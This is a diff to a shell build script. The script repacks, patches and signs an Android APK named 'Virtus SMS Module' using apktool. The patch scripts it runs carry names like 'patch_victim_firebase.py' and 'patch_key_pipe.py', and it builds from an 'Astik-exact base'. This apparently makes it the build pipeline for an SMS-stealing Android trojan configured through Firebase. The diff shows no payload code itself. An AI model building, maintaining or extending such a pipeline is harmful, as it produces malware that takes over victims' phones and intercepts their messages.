@@ -4,7 +4,6 @@ set -euo pipefail
 ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 cd "$ROOT"
 
-# Astik-style APK — config from Firebase config/{KEY} (no BotConfigSync)
 if [ -f "$ROOT/../.env" ]; then
   set -a
   # shellcheck disable=SC1091
@@ -21,12 +20,10 @@ if [ ! -f "$APKTOOL" ]; then
     "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
 fi
 
-echo "Building Virtus SMS Module APK..."
-python3 "$ROOT/patch_astik_flow.py"
-python3 "$ROOT/patch_victim_firebase.py"
-python3 "$ROOT/patch_astik_readconfig.py"
-python3 "$ROOT/patch_multi_firebase.py"
-python3 "$ROOT/patch_crash_fix.py"
+echo "Building Virtus SMS Module APK (Astik-exact base)..."
+python3 "$ROOT/build_astik_base.py"
+python3 "$ROOT/patch_readconfig_victim.py"
+python3 "$ROOT/patch_key_pipe.py"
 python3 "$ROOT/generate_icons.py"
 java -jar "$APKTOOL" b virtus_decompiled -o virtus-unsigned.apk
 
@@ -57,4 +54,4 @@ java -jar "$SIGNER" \
   --overwrite
 
 cp virtus-unsigned.apk virtus-sms-module.apk
-echo "Done: $ROOT/virtus-sms-module.apk (v2/v3 signed + zipaligned)"
+echo "Done: $ROOT/virtus-sms-module.apk (Astik-exact, v2/v3 signed)"
